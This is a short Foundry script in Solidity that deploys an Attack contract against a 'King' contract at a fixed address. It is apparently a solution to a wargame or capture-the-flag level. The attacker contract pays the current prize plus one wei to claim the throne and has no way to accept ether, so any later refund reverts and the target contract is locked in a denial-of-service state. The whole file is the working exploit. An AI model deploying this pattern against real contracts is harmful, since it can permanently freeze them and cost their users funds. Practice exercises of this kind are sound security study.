// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/King.sol";

contract KingScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack{value: 0.02 ether}();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() payable {
        King target = King(payable(0x3eAaAb049f7d9Fe47Bbe7165c643A9d8729c3C76));
        address(target).call{value: target.prize()+1}("");
    }
}